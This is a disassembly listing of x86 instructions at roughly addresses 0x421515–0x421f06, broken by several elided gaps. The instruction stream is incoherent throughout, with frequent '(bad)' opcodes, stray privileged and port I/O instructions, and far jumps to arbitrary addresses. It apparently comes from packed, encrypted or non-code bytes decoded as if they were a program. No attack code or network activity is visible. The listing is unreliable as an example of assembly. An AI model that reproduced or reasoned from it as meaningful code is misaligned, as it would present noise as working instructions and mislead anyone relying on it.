  421515:	add    dh,dl
  421517:	repnz test BYTE PTR [eax],bl
  42151a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42151b:	jle    0x4214fb
  42151d:	(bad)  
  42151e:	stc    
  42151f:	test   DWORD PTR [ecx],edx
  421521:	popa   
  421522:	test   al,0x64
  421524:	hlt    
  421525:	arpl   si,dx
  421527:	popa   
  421528:	add    DWORD PTR [eax],eax
  42152a:	pop    es
  42152b:	add    DWORD PTR [eax],eax
  42152d:	add    BYTE PTR [edx],cl
  42152f:	nop
  421530:	pop    ds
  421531:	into   
  421532:	fcom   DWORD PTR [edi+0x6e096e41]
  421538:	pop    ecx
  421539:	sbb    bl,dl
  42153b:	cmp    al,0xc6
  42153d:	add    BYTE PTR [edx-0x1b95ec8f],dh
  421543:	and    BYTE PTR [eax-0x21],ah
  421546:	push   ss
  421547:	js     0x421576
  421549:	mov    edi,0xdc53750a
  42154e:	sub    BYTE PTR [esi+0xd8d2f49],al
  421554:	(bad)  
  421555:	(bad)  
  421556:	ins    DWORD PTR es:[edi],dx
  421557:	sbb    bl,BYTE PTR [eax-0x22]
  42155a:	xor    ch,cl
  42155c:	pushf  
  42155d:	mov    ch,0xef
  42155f:	jle    0x4215c3
  421561:	xchg   esi,eax
  421562:	lahf   
  421563:	jg     0x4215c6
  421565:	mov    WORD PTR [edi-0x3d851007],ds
  42156b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42156c:	inc    ebp
  42156d:	stc    
  42156e:	out    dx,al
  42156f:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  421571:	sub    al,BYTE PTR [ecx+ebp*8+0x55]
  421575:	xchg   DWORD PTR [edi],esp
  421577:	cmp    eax,0x52378f6b
  42157c:	pop    ss
  42157d:	les    ebp,FWORD PTR ds:0x1f978aa1
  421583:	test   al,0x73
  421585:	or     cl,BYTE PTR [eax-0x6c]
  421588:	push   ds
  421589:	mov    eax,0x28bb6094
  42158e:	add    ch,dh
  421590:	je     0x421568
  421592:	add    cl,cl
  421594:	adc    ebx,DWORD PTR [eax-0x46e6c917]
  42159a:	cld    
  42159b:	aaa    
  42159c:	or     eax,0xc6203087
  4215a1:	lea    ecx,[ecx+0x29]
  4215a4:	mov    eax,0xe20b54df
  4215a9:	sbb    ecx,ebp
  4215ab:	popa   
  4215ac:	jmp    0x1f95:0xedcb32c3
  4215b3:	and    ebx,eax
  4215b5:	shr    BYTE PTR ss:[edx+0x8],1
  4215b9:	inc    eax
  4215ba:	jnp    0x4215ef
  4215bc:	dec    ebp
  4215bd:	pusha  
  4215be:	fiadd  DWORD PTR [edx]
  4215c0:	mov    ebp,0x99d1d461
  4215c5:	push   ebx
  4215c6:	inc    DWORD PTR [ecx-0x44]
  4215c9:	mov    cl,0x57
  4215cb:	inc    edi
  4215cc:	imul   esi,DWORD PTR [ebp+0x1a3e6cef],0xc301291e
  4215d6:	sub    BYTE PTR [edx+edx*1+0x5e],ah
  4215da:	or     al,BYTE PTR [ebp-0x793e6d9f]
  4215e0:	dec    edx
  4215e1:	and    al,0x77
  4215e3:	mov    cl,0x23
  4215e5:	fwait
  4215e6:	push   cs
  4215e7:	pop    eax
  4215e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215e9:	pop    esi
  4215ea:	jp     0x4215cf
  4215ec:	inc    esp
  4215ed:	jge    0x4215e1
  4215ef:	dec    esi
  4215f0:	mov    ch,0xf0
  4215f2:	pop    ecx
  4215f3:	xor    eax,DWORD PTR [eax+edx*4+0x3c6f803a]
  4215fa:	daa    
  4215fb:	inc    eax
  4215fc:	xchg   ebx,eax
  4215fd:	shl    BYTE PTR [edi],cl
  4215ff:	std    
  421600:	cs xchg ebx,eax
  421602:	inc    eax
  421603:	sub    DWORD PTR [ebx],0xffffffb0
  421606:	jno    0x4215fd
  421608:	inc    eax
  421609:	cld    
  42160a:	add    DWORD PTR [esp+edi*1],0x4c
  42160e:	repnz and eax,0x28a19faf
  421614:	jo     0x421668
  421616:	jae    0x421691
  421618:	jmp    0xbc927ccb
  42161d:	add    eax,0xd6a72150
  421622:	jp     0x421653
  421624:	adc    eax,0x80aad32f
  421629:	jno    0x42168e
  42162b:	dec    edx
  42162c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42162d:	mov    dh,0x82
  42162f:	mov    dh,BYTE PTR [ebx-0x5f]
  421632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421633:	mov    edx,?
	...
  421695:	add    BYTE PTR [ebx-0x105512d4],ch
  42169b:	jmp    0x42168c
  42169d:	sub    eax,0xf9231b1e
  4216a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216a3:	in     al,dx
  4216a4:	stos   DWORD PTR es:[edi],eax
  4216a5:	daa    
  4216a6:	frstor [edx+0x1]
  4216a9:	add    BYTE PTR [edi],al
  4216ab:	add    DWORD PTR [eax],eax
  4216ad:	add    bh,bl
  4216af:	add    DWORD PTR [esp+eiz*2+0x5dd79ab4],ecx
  4216b6:	pop    edx
  4216b7:	mov    eax,ds:0x45ec3eed
  4216bc:	jnp    0x42167f
  4216be:	push   eax
  4216bf:	dec    edx
  4216c0:	mov    al,0x2
  4216c2:	fmul   DWORD PTR [edi-0x80]
  4216c5:	dec    esp
  4216c6:	mov    ch,0xe1
  4216c8:	fwait
  4216c9:	lods   eax,DWORD PTR ds:[esi]
  4216ca:	call   0x8aa771b2
  4216cf:	data16 sub bh,BYTE PTR [ecx+0x13e991b4]
  4216d6:	pop    edx
  4216d7:	mov    al,ds:0x8df58c8
  4216dc:	repz ss mov edx,0x3b892bfa
  4216e3:	inc    eax
  4216e4:	dec    ebp
  4216e5:	repz mov dl,dh
  4216e8:	loop   0x421752
  4216ea:	adc    bh,BYTE PTR [eax-0xa58cb89]
  4216f0:	adc    ah,BYTE PTR [ebp-0x49]
  4216f3:	push   ss
  4216f4:	loope  0x42168f
  4216f6:	loopne 0x421722
  4216f8:	pop    eax
  4216f9:	push   ebx
  4216fa:	lods   eax,DWORD PTR gs:[esi]
  4216fc:	lds    esi,FWORD PTR [ebp+0x2eb6bec8]
  421702:	xchg   ebx,eax
  421703:	sbb    WORD PTR [ebp-0x5f],si
  421707:	inc    esi
  421708:	cld    
  421709:	sub    DWORD PTR [ebp-0x65],0xfffffff6
  42170d:	sub    al,0x8f
  42170f:	sub    edx,esp
  421711:	jno    0x4216fd
  421713:	in     eax,0xd3
  421715:	jecxz  0x4216fb
  421717:	test   DWORD PTR [ecx-0x43],ecx
  42171a:	cld    
  42171b:	scas   al,BYTE PTR es:[edi]
  42171c:	test   eax,0x47049251
  421721:	aad    0x8b
  421723:	mov    eax,ds:0x2fdf88b8
  421728:	add    esp,DWORD PTR [eax]
  42172a:	pop    edi
  42172b:	mov    ds:0x2dbd1a40,al
  421730:	xor    DWORD PTR [eax-0x36ec5190],esp
  421736:	retf   
  421737:	out    0xcc,eax
  421739:	lods   eax,DWORD PTR ds:[esi]
  42173a:	xchg   edx,eax
  42173b:	pop    ebx
  42173c:	in     ax,0xea
  42173f:	loop   0x421762
  421741:	add    edi,0x52728588
  421747:	loope  0x4216d1
  421749:	fild   WORD PTR [ebx]
  42174b:	mov    al,BYTE PTR [eax+0x35]
  42174e:	fistp  DWORD PTR [esi+0x6178c475]
  421754:	adc    eax,0xf0048a55
  421759:	das    
  42175a:	das    
  42175b:	xchg   edi,eax
  42175c:	pop    ecx
  42175d:	push   0x3c
  42175f:	arpl   WORD PTR [esi],si
  421761:	xor    edx,DWORD PTR [edi]
  421763:	pop    eax
  421764:	inc    ebx
  421765:	bound  edx,QWORD PTR [ebp+eiz*8+0x49]
  421769:	cdq    
  42176a:	out    0xee,eax
  42176c:	mov    edi,0xb73b79c6
  421771:	cmc    
  421772:	test   al,0x7a
  421774:	mov    esp,0x19c8ef9a
  421779:	test   esi,esi
  42177b:	push   es
  42177c:	mov    bl,0xcd
  42177e:	mov    esi,0x52e72c66
  421783:	inc    eax
  421784:	adc    DWORD PTR [ebp-0x70],edx
  421787:	and    al,0x8c
  421789:	sbb    ecx,ebx
  42178b:	fdivr  st(2),st
  42178d:	cmc    
  42178e:	add    al,BYTE PTR [edx+0x1ee752ab]
  421794:	lock enter 0xa87b,0x40
  421799:	(bad)  
  42179a:	loopne 0x4217bc
  42179c:	xchg   bh,bh
  42179e:	into   
  42179f:	clc    
  4217a0:	sub    DWORD PTR [ebx],ecx
  4217a2:	sub    al,0x73
  4217a4:	enter  0x53ed,0x75
  4217a8:	imul   esp,DWORD PTR [ebx-0xf012340],0x3597d44e
  4217b2:	int    0x65
  4217b4:	fadd   QWORD PTR [eax]
	...
  421816:	shl    DWORD PTR [eax-0x6061f47],1
  42181c:	fnstenv [ecx-0x7ac22162]
  421822:	gs leave 
  421824:	cmp    dl,BYTE PTR [edx-0x1c]
  421827:	arpl   WORD PTR [ecx],ax
  421829:	add    BYTE PTR [edi],al
  42182b:	add    DWORD PTR [eax],eax
  42182d:	add    BYTE PTR [ebx-0xfa6605b],cl
  421833:	lahf   
  421834:	pop    ebp
  421835:	shl    BYTE PTR [ebx],cl
  421837:	and    ebp,DWORD PTR [edx]
  421839:	xor    DWORD PTR [edx],esp
  42183b:	ins    BYTE PTR es:[edi],dx
  42183c:	into   
  42183d:	xchg   esp,eax
  42183e:	repz push es
  421840:	stos   DWORD PTR es:[edi],eax
  421841:	out    dx,al
  421842:	div    DWORD PTR [ebx]
  421844:	sbb    dh,BYTE PTR [edx]
  421846:	mov    dh,0x33
  421848:	mov    fs:0xf30e96b5,eax
  42184e:	clc    
  42184f:	addr16 sti 
  421851:	pushf  
  421852:	mov    eax,ds:0xa2b166d3
  421857:	fdivr  DWORD PTR [ebx-0x7c7282ec]
  42185d:	test   DWORD PTR [esi+0x8],0xac1e3714
  421864:	sti    
  421865:	xlat   BYTE PTR ds:[ebx]
  421866:	mov    ebx,0x4bafe3df
  42186b:	jle    0x4218bb
  42186d:	mov    al,ds:0x8d36247a
  421872:	mov    cl,0xc
  421874:	push   ss
  421875:	loopne 0x421897
  421877:	sub    eax,0x4e0c1a6d
  42187c:	jmp    0x421829
  42187e:	test   BYTE PTR [edx-0x1c],ah
  421881:	and    DWORD PTR [edi-0x16],ecx
  421884:	jo     0x4218c4
  421886:	push   ecx
  421887:	or     eax,0xa2943ddd
  42188c:	xchg   ebp,eax
  42188d:	icebp  
  42188e:	push   0x26
  421890:	popf   
  421891:	addr16 fs jae 0x42184a
  421895:	aad    0x80
  421897:	dec    bp
  421899:	adc    al,0x45
  42189b:	fist   WORD PTR [edi]
  42189d:	enter  0x7f88,0x55
  4218a1:	jnp    0x42189a
  4218a3:	sub    al,0x40
  4218a5:	push   esp
  4218a6:	ja     0x4218c2
  4218a8:	mov    al,ds:0x4e87f0c1
  4218ad:	xchg   ebp,eax
  4218ae:	ror    BYTE PTR [eax],cl
  4218b0:	in     al,0x8d
  4218b2:	sbb    DWORD PTR [ebx+0x6d],eax
  4218b5:	cmovs  esp,DWORD PTR [edx-0x5a2cebc1]
  4218bc:	mov    ah,0x11
  4218be:	push   esp
  4218bf:	mov    eax,0xa861f536
  4218c4:	push   cs
  4218c5:	add    al,ah
  4218c7:	xchg   DWORD PTR [ebx],ecx
  4218c9:	vpavgb xmm0,xmm6,XMMWORD PTR [eax]
  4218cd:	jae    0x4218a7
  4218cf:	lahf   
  4218d0:	push   0xffffffe1
  4218d2:	jecxz  0x42188f
  4218d4:	cmp    DWORD PTR [edx+0x4e306682],esp
  4218da:	neg    dl
  4218dc:	in     al,dx
  4218dd:	mul    BYTE PTR [eax]
  4218df:	mov    ds:0x59e33d5d,al
  4218e4:	sbb    dl,bl
  4218e6:	aam    0x49
  4218e8:	dec    eax
  4218e9:	jo     0x421872
  4218eb:	jecxz  0x421933
  4218ed:	bound  esi,QWORD PTR [esi]
  4218ef:	fidivr WORD PTR [edx-0x2e]
  4218f2:	popa   
  4218f3:	push   es
  4218f4:	xchg   edi,eax
  4218f5:	or     al,BYTE PTR [edi+0x63627c5d]
  4218fb:	loopne 0x421954
  4218fd:	pop    esp
  4218fe:	hlt    
  4218ff:	mov    eax,0xb4fe260b
  421904:	mov    eax,ds:0x62e5d806
  421909:	lds    edi,FWORD PTR [esi]
  42190b:	mov    ss,WORD PTR [edi-0x1b]
  42190e:	xor    DWORD PTR [ecx+0x1b6abe0f],ebx
  421914:	sbb    eax,0xae388a2
  421919:	out    dx,eax
  42191a:	xchg   esi,eax
  42191b:	sbb    DWORD PTR [eax+0x51],edx
  42191e:	jmp    0xa3539392
  421923:	sahf   
  421924:	arpl   WORD PTR [edi+0x71],bx
  421927:	leave  
  421928:	or     eax,0x1680696b
  42192d:	dec    ebx
  42192e:	jno    0x4218b3
  421930:	sub    al,0xd6
  421932:	xchg   ebp,eax
  421933:	mov    dl,0x70
	...
  421995:	add    dh,bh
  421997:	cld    
  421998:	je     0x4219b7
  42199a:	jbe    0x421939
  42199c:	(bad)  
  42199d:	dec    DWORD PTR [ebx-0x3d]
  4219a0:	rcl    DWORD PTR [edx+0x7a290ab3],0xeb
  4219a7:	add    DWORD PTR fs:[eax],eax
  4219aa:	pop    es
  4219ab:	add    DWORD PTR [eax],eax
  4219ad:	add    BYTE PTR [esi-0x2a],bl
  4219b0:	inc    esi
  4219b1:	xlat   BYTE PTR ds:[ebx]
  4219b2:	sbb    eax,0xa8476e37
  4219b7:	push   0xcdd4a906
  4219bc:	inc    ecx
  4219bd:	rcl    DWORD PTR [edi+0xe],1
  4219c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219c1:	int    0x9a
  4219c3:	push   ebx
  4219c4:	dec    edx
  4219c5:	in     eax,0x7a
  4219c7:	adc    DWORD PTR [ecx-0x5391fe4b],ebx
  4219cd:	test   BYTE PTR [esp+0xb],0x5f
  4219d2:	int3   
  4219d3:	popa   
  4219d4:	cdq    
  4219d5:	(bad)  
  4219d6:	(bad)  
  4219d7:	std    
  4219d8:	imul   esp,DWORD PTR ds:0xd8e74870,0x3d
  4219df:	nop
  4219e0:	aad    0x4b
  4219e2:	fimul  WORD PTR [edx]
  4219e4:	enter  0x5594,0xd3
  4219e8:	xor    eax,0xf483e6e8
  4219ed:	cmp    edx,esp
  4219ef:	mov    bh,BYTE PTR [ebx]
  4219f1:	scas   al,BYTE PTR es:[edi]
  4219f2:	adc    DWORD PTR [edx-0x54],esi
  4219f5:	scas   al,BYTE PTR es:[edi]
  4219f6:	in     eax,0x75
  4219f8:	dec    edi
  4219f9:	mov    eax,0x1de1b681
  4219fe:	jo     0x4219f2
  421a00:	imul   edi,DWORD PTR ds:0x92c36fb4,0xffffffdd
  421a07:	xor    DWORD PTR [edx],edx
  421a09:	jge    0x421a51
  421a0b:	push   cs
  421a0c:	popf   
  421a0d:	pop    ds
  421a0e:	xchg   edi,eax
  421a0f:	test   ebp,edi
  421a11:	lock pusha 
  421a13:	out    dx,al
  421a14:	sbb    cl,bl
  421a16:	add    esp,DWORD PTR [edi-0x6f]
  421a19:	popa   
  421a1a:	sub    DWORD PTR [ebx],ebx
  421a1c:	add    esp,0xec1db2fe
  421a22:	push   0xffffffb0
  421a24:	lahf   
  421a25:	push   esi
  421a26:	jmp    0xf7e1d73d
  421a2b:	cs call 0x89e2:0xca6256a4
  421a33:	mov    dh,0x24
  421a35:	stc    
  421a36:	and    BYTE PTR ds:0x32d0f566,al
  421a3c:	out    dx,eax
  421a3d:	sub    al,0x45
  421a3f:	cld    
  421a40:	jle    0x4219f1
  421a42:	mov    al,0xb
  421a44:	xchg   edx,eax
  421a45:	imul   edi,DWORD PTR [ebx-0x1974ad70],0xffffffee
  421a4c:	test   eax,0x2317db57
  421a51:	call   0x49ac:0x267a548d
  421a58:	adc    al,0x46
  421a5a:	inc    ebx
  421a5b:	arpl   WORD PTR [eax-0x303fc13e],sp
  421a61:	ret    
  421a62:	xchg   ebp,eax
  421a63:	add    BYTE PTR [edi],cl
  421a65:	dec    eax
  421a66:	mov    eax,0xc00df50a
  421a6b:	ret    0x97ac
  421a6e:	mov    ds:0xc6f1cab3,al
  421a73:	lea    ecx,[ecx-0x73a2ee7]
  421a79:	shl    ecx,0xe3
  421a7c:	pop    esi
  421a7d:	cwde   
  421a7e:	push   eax
  421a7f:	ror    DWORD PTR [eax*1+0x611444c6],1
  421a86:	clc    
  421a87:	inc    edi
  421a88:	sbb    edx,DWORD PTR [ecx+0x356f3c52]
  421a8e:	cmp    DWORD PTR [edx+0x72],eax
  421a91:	xchg   ebp,eax
  421a92:	xchg   ebx,eax
  421a93:	cmp    al,al
  421a95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a96:	fst    QWORD PTR [edx]
  421a98:	lods   eax,DWORD PTR ds:[esi]
  421a99:	or     BYTE PTR [ecx+0x2e],cl
  421a9c:	in     al,dx
  421a9d:	sahf   
  421a9e:	int    0x2c
  421aa0:	js     0x421aa5
  421aa2:	adc    ch,BYTE PTR [ecx+0x28]
  421aa5:	mov    esp,DWORD PTR [ecx+0x2baabc10]
  421aab:	mov    cl,0x79
  421aad:	fidiv  WORD PTR [edi-0x60]
  421ab0:	outs   dx,BYTE PTR ds:[esi]
  421ab1:	xchg   esp,eax
  421ab2:	sub    al,0x7d
  421ab4:	mov    ch,0x0
	...
  421b16:	push   ss
  421b17:	cdq    
  421b18:	jmp    0x37400aea
  421b1d:	fcmovnu st,st(5)
  421b1f:	sahf   
  421b20:	test   DWORD PTR [edx+0x52b3a03],0x165f2
  421b2a:	pop    es
  421b2b:	add    DWORD PTR [eax],eax
  421b2d:	add    BYTE PTR [eax-0x56092742],ch
  421b33:	cs sar bl,1
  421b36:	shld   DWORD PTR [edi],ecx,0xb1
  421b3a:	or     al,0xe5
  421b3c:	and    al,0xca
  421b3e:	xchg   bh,dh
  421b40:	sbb    eax,0x5492bdec
  421b45:	adc    eax,0x4e3169d3
  421b4a:	xchg   DWORD PTR [ebp+0x5c3718c7],ebp
  421b50:	sbb    DWORD PTR [edi-0x6203e4b3],0x58
  421b57:	mov    esi,0xcde5553c
  421b5c:	imul   eax,DWORD PTR [esi],0x4f
  421b5f:	mov    ebp,DWORD PTR [edx]
  421b61:	pop    eax
  421b62:	fs cmp eax,0x88f52a3e
  421b68:	mov    ds:0x552455aa,al
  421b6d:	std    
  421b6e:	pop    edx
  421b6f:	stos   BYTE PTR es:[edi],al
  421b70:	or     bh,bl
  421b72:	rcr    dh,cl
  421b74:	cmp    eax,0xe594ab86
  421b79:	inc    ebx
  421b7a:	inc    ebx
  421b7b:	or     edx,0x9b701484
  421b81:	sbb    bh,al
  421b83:	ja     0x421b37
  421b85:	stos   DWORD PTR es:[edi],eax
  421b86:	sbb    al,BYTE PTR [esi+0x55]
  421b89:	add    dl,BYTE PTR [eax-0x18]
  421b8c:	aam    0xec
  421b8e:	out    0x14,al
  421b90:	dec    edi
  421b91:	jle    0x421b66
  421b93:	aas    
  421b94:	ds sub eax,0xaf8a5def
  421b9a:	or     BYTE PTR [eax-0x38],cl
  421b9d:	add    DWORD PTR [edi-0x34],ecx
  421ba0:	xor    bl,ah
  421ba2:	jl     0x421be9
  421ba4:	jbe    0x421bf1
  421ba6:	jne    0x421b71
  421ba8:	jnp    0x421bfd
  421baa:	ds ret 0x8fa1
  421bae:	jl     0x421c24
  421bb0:	mov    bl,0x72
  421bb2:	cwde   
  421bb3:	loope  0x421b5f
  421bb5:	inc    eax
  421bb6:	ret    0x3487
  421bb9:	push   edx
  421bba:	shl    DWORD PTR ds:0x76bd503d,0x6
  421bc1:	dec    edx
  421bc2:	push   edi
  421bc3:	jbe    0x421b90
  421bc5:	mov    ebx,0x5478588b
  421bca:	mov    eax,ds:0x24f552dc
  421bcf:	jo     0x421b7c
  421bd1:	fsubr  QWORD PTR [edx]
  421bd3:	inc    edx
  421bd4:	push   edi
  421bd5:	fidiv  WORD PTR [ebp+0x72]
  421bd8:	pop    ecx
  421bd9:	jb     0x421c23
  421bdb:	jg     0x421b84
  421bdd:	jns    0x421b95
  421bdf:	inc    ecx
  421be0:	dec    ebx
  421be1:	outs   dx,DWORD PTR ds:[esi]
  421be2:	cmp    BYTE PTR [ebp+edi*4+0x65],dl
  421be6:	pop    esp
  421be7:	dec    esp
  421be8:	pusha  
  421be9:	pop    ss
  421bea:	das    
  421beb:	or     edx,DWORD PTR [esi-0x27]
  421bee:	push   es
  421bef:	and    DWORD PTR [ebx+0x319c69f6],ebp
  421bf5:	cmp    eax,0x3412220d
  421bfa:	test   al,0x99
  421bfc:	mov    dh,0x59
  421bfe:	push   cs
  421bff:	rol    BYTE PTR [ecx],cl
  421c01:	xor    bl,bl
  421c03:	adc    al,0xa9
  421c05:	int    0x3e
  421c07:	int    0xfb
  421c09:	cmovno esp,DWORD PTR [edx]
  421c0c:	xchg   BYTE PTR [ebx],bl
  421c0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c0f:	adc    eax,edi
  421c11:	in     eax,dx
  421c12:	cli    
  421c13:	and    BYTE PTR [edi],0xf
  421c16:	pop    esp
  421c17:	or     cl,0x3d
  421c1a:	ret    
  421c1b:	pop    ds
  421c1c:	xlat   BYTE PTR ds:[ebx]
  421c1d:	fs dec ebx
  421c1f:	sbb    eax,0x3f8aa70a
  421c24:	mov    al,ds:0x7fadcd54
  421c29:	call   0x1a1fd0ec
  421c2e:	pop    es
  421c2f:	add    BYTE PTR [eax-0x76d18ef9],al
	...
  421c95:	add    BYTE PTR [eax-0x1a4a95],dh
  421c9b:	push   eax
  421c9d:	jg     0x421c36
  421c9f:	shl    DWORD PTR [ebp+0x4ec1ad19],0x27
  421ca6:	stc    
  421ca7:	add    WORD PTR [eax],ax
  421caa:	pop    es
  421cab:	add    DWORD PTR [eax],eax
  421cad:	add    BYTE PTR ds:0xae19dcce,dl
  421cb3:	fisub  DWORD PTR [edi+edi*1+0xf]
  421cb7:	pop    esp
  421cb8:	imul   ecx,edx,0x38
  421cbb:	pop    es
  421cbc:	mov    cl,0x48
  421cbe:	inc    edi
  421cbf:	lds    ecx,FWORD PTR [esi]
  421cc1:	aas    
  421cc2:	push   ss
  421cc3:	dec    edi
  421cc4:	mov    ch,0x1
  421cc6:	inc    eax
  421cc7:	pop    es
  421cc8:	idiv   BYTE PTR [ecx-0x7a]
  421ccb:	fldcw  WORD PTR [edi+eax*2-0x67]
  421ccf:	(bad)  
  421cd0:	jne    0x421cf0
  421cd2:	inc    edx
  421cd3:	shl    DWORD PTR [eax],1
  421cd5:	add    al,0x44
  421cd8:	inc    edi
  421cd9:	cwde   
  421cda:	(bad)  
  421cdb:	dec    edx
  421cdc:	add    dl,BYTE PTR [ecx+0x77e54bad]
  421ce2:	push   edx
  421ce3:	xor    ebx,esp
  421ce5:	jp     0x421cd6
  421ce7:	push   ss
  421ce8:	popa   
  421ce9:	xor    ebp,DWORD PTR [esi]
  421ceb:	clc    
  421cec:	or     DWORD PTR [eax],esp
  421cee:	sbb    ebx,edx
  421cf0:	cmc    
  421cf1:	xchg   esi,eax
  421cf2:	sar    BYTE PTR [eax-0x61fac85d],cl
  421cf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cf9:	add    esp,ebx
  421cfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421cfc:	cmp    BYTE PTR [ecx+0x672e28b9],cl
  421d02:	adc    BYTE PTR [esp+eax*8-0x165dfac2],bh
  421d09:	and    eax,0x753f1514
  421d0e:	scas   eax,DWORD PTR es:[edi]
  421d0f:	lds    esi,FWORD PTR [ecx+0x22]
  421d12:	add    eax,0x77a92ba4
  421d17:	push   edx
  421d18:	xor    dl,BYTE PTR [eax]
  421d1a:	push   ebx
  421d1b:	add    eax,0x93c31e35
  421d20:	inc    esi
  421d21:	and    BYTE PTR [ecx],bl
  421d23:	scas   al,BYTE PTR es:[edi]
  421d24:	and    eax,0x70bbdbec
  421d29:	dec    edi
  421d2a:	ds cwde 
  421d2c:	outs   dx,DWORD PTR ds:[esi]
  421d2d:	pop    ss
  421d2e:	ins    DWORD PTR es:[edi],dx
  421d2f:	push   ss
  421d30:	(bad)  
  421d31:	fisubr DWORD PTR [edi+0xb]
  421d34:	cs es iret 
  421d37:	neg    ah
  421d39:	cdq    
  421d3a:	enter  0x247d,0x29
  421d3e:	cmp    DWORD PTR [ebp+eax*8+0x5f],ebx
  421d42:	mov    eax,ds:0x6f44a97b
  421d47:	jnp    0x421d7e
  421d49:	mov    eax,ds:0xb99cb957
  421d4e:	add    bh,0x90
  421d51:	mov    dh,0xd1
  421d53:	cdq    
  421d54:	in     eax,0xaa
  421d56:	sti    
  421d57:	gs mov ah,0xc
  421d5a:	neg    BYTE PTR [edx]
  421d5c:	fist   WORD PTR [eax-0x18bc7f2e]
  421d62:	cmp    ebx,esi
  421d64:	adc    BYTE PTR [esi],bh
  421d66:	sar    DWORD PTR ds:0x5d2c18c3,cl
  421d6c:	add    al,0xb5
  421d6e:	xor    ebx,ebp
  421d70:	repz mov cl,0x49
  421d73:	push   ebx
  421d74:	pop    es
  421d75:	mov    ah,0xeb
  421d77:	sub    bh,ah
  421d79:	inc    edi
  421d7a:	imul   ebx,DWORD PTR [edi-0x2c],0x407db63
  421d81:	jl     0x421d1c
  421d83:	cdq    
  421d84:	sbb    DWORD PTR [edi-0x4f],ebp
  421d87:	paddsb mm5,QWORD PTR [ebx-0x1b699f42]
  421d8e:	fcmove st,st(2)
  421d90:	mov    eax,DWORD PTR [eax-0x78]
  421d93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d94:	and    al,0xb3
  421d96:	pop    esi
  421d97:	mov    edx,0x797e7156
  421d9c:	inc    BYTE PTR [ebp-0x18]
  421d9f:	jmp    0x824:0x8a37b54f
  421da6:	lds    ecx,FWORD PTR [ebx+0x36741cc7]
  421dac:	inc    esi
  421dad:	outs   dx,DWORD PTR ds:[esi]
  421dae:	sbb    eax,DWORD PTR [eax+esi*8]
  421db1:	mov    ebx,0xc0e213
	...
  421e16:	iret   
  421e17:	mov    eax,ds:0xbf7f851b
  421e1c:	fucomip st,st(3)
  421e1e:	lock jbe 0x421e3b
  421e21:	cmp    cl,bh
  421e23:	(bad)  
  421e24:	and    al,0x24
  421e26:	add    BYTE PTR [eax+0x1],ch
  421e29:	add    BYTE PTR [edi],al
  421e2b:	add    DWORD PTR [eax],eax
  421e2d:	add    BYTE PTR [edx+ebp*8],ch
  421e30:	aam    0xe0
  421e32:	pop    ecx
  421e33:	cdq    
  421e34:	ret    
  421e35:	popa   
  421e36:	or     BYTE PTR [ebx+edx*8],bl
  421e39:	sbb    ecx,DWORD PTR [ebp+eax*1+0x3a]
  421e3d:	cmp    BYTE PTR [ebp+0x52468975],0x8a
  421e44:	das    
  421e45:	xor    eax,0xc2395f8d
  421e4a:	test   al,0x90
  421e4c:	mov    esp,0x52aa6682
  421e51:	and    BYTE PTR [edi],0xc
  421e54:	dec    ebp
  421e55:	in     eax,0xc4
  421e57:	jne    0x421eb4
  421e59:	or     esp,DWORD PTR [ebx+0x2de9222a]
  421e5f:	sbb    BYTE PTR [ecx+0x65],0xe0
  421e63:	push   edx
  421e64:	sbb    eax,0xafceea21
  421e69:	or     ecx,DWORD PTR [esi+esi*2+0x2d]
  421e6d:	or     ah,bh
  421e6f:	outs   dx,BYTE PTR ds:[esi]
  421e70:	xor    bh,BYTE PTR [eax+esi*2+0x71]
  421e74:	push   ebp
  421e75:	lea    esp,[ebp-0x54f89afd]
  421e7b:	or     eax,0x137f3e47
  421e80:	cmp    BYTE PTR [edi],al
  421e82:	adc    al,cl
  421e84:	mul    BYTE PTR [edx+ecx*4]
  421e87:	inc    ecx
  421e88:	sbb    eax,0xfef6b255
  421e8d:	in     eax,dx
  421e8e:	jmp    0x4ab4c02b
  421e93:	loopne 0x421ebe
  421e95:	in     eax,dx
  421e96:	mov    edi,DWORD PTR [eax]
  421e98:	jmp    0x421e89
  421e9a:	stos   BYTE PTR es:[edi],al
  421e9b:	xor    BYTE PTR [edi+ebp*1-0x27],dl
  421e9f:	mov    ch,0xec
  421ea1:	inc    ebx
  421ea2:	lods   al,BYTE PTR ds:[esi]
  421ea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ea5:	popa   
  421ea6:	inc    eax
  421ea7:	imul   ebp,edi,0xf64b4a9c
  421ead:	aam    0x46
  421eaf:	mov    esi,0xaeaf4c8e
  421eb4:	fsubr  QWORD PTR [eax-0x2e]
  421eb7:	or     bl,BYTE PTR [edi+0x30]
  421eba:	xor    DWORD PTR [edi-0x777f2c1d],ebx
  421ec0:	test   BYTE PTR [eax+0x1a],cl
  421ec3:	pushf  
  421ec4:	and    eax,0xb4230415
  421ec9:	loop   0x421e4d
  421ecb:	lods   al,BYTE PTR ds:[esi]
  421ecc:	es call 0x93d5:0x3f7b01d5
  421ed4:	mov    eax,0x661c2ca3
  421ed9:	mov    esi,0x707d5667
  421ede:	dec    edi
  421edf:	daa    
  421ee0:	dec    ecx
  421ee1:	xchg   ecx,eax
  421ee2:	jecxz  0x421e71
  421ee4:	ret    0x35d7
  421ee7:	dec    edx
  421ee8:	enter  0xd079,0x83
  421eec:	xchg   esi,eax
  421eed:	pop    eax
  421eee:	xchg   edx,eax
  421eef:	sti    
  421ef0:	idiv   BYTE PTR [edi+0x456e6a9d]
  421ef6:	lds    edi,FWORD PTR gs:[ebp+ebp*4-0x45]
  421efb:	mov    al,0x1f
  421efd:	push   0x0
  421eff:	and    BYTE PTR [edi+0x13e9e807],0x3e
  421f06:	add    ch,BYTE PTR [ecx-0x68678d22]
